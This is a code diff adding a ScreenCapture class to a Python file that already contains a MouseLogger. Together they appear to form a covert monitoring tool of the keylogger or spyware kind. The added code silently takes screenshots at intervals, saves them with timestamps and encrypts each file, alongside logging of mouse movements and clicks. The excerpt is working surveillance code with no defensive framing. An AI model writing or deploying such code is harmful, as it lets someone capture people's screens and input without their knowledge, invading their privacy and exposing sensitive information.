@@ -128,3 +128,20 @@ class MouseLogger:
         with MouseListener(on_move=self.on_move, on_click=self.on_click) as listener:
             while not stop_threads:
                 listener.join(timeout=1)
+
+class ScreenCapture:
+    def __init__(self, file_path, interval, duration, key):
+        self.file_path = file_path
+        self.interval = interval
+        self.duration = duration
+        self.key = key
+
+    def capture(self):
+        start_time = time.time()
+        while (time.time() - start_time) < self.duration and not stop_threads:
+            timestamp = time.strftime("%Y%m%d-%H%M%S")
+            screenshot_filename = f"screenshot_{timestamp}.png"
+            screenshot = pyautogui.screenshot()
+            screenshot.save(self.file_path + screenshot_filename)
+            encrypt_file(self.file_path + screenshot_filename, self.key)
+            time.sleep(self.interval)
